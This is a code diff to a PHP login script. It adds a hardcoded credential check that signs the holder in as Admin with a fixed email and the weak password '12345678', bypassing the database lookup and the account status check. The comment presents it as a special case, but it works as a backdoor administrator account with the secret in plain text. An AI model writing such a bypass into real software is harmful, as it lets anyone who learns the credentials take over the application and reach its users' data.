@@ -15,6 +15,20 @@ if ($credential === '' || $password === '') {
     exit;
 }
 
+// Special-case: allow fixed admin credential to sign in as Admin without DB lookup
+if ($credential === 'adminopmdc@gmail.com' && $password === '12345678') {
+    $_SESSION['user'] = [
+        'id' => 0,
+        'username' => 'adminopmdc',
+        'email' => 'adminopmdc@gmail.com',
+        'name' => 'Admin',
+        'role' => 'Admin',
+        'barangayName' => null
+    ];
+    echo json_encode(['success' => true, 'role' => 'Admin']);
+    exit;
+}
+
 $mysqli = require __DIR__ . '/db.php';
 
 $sql = "SELECT id, username, email, password, name, role, barangayName, status FROM users WHERE username = ? OR email = ? LIMIT 1";
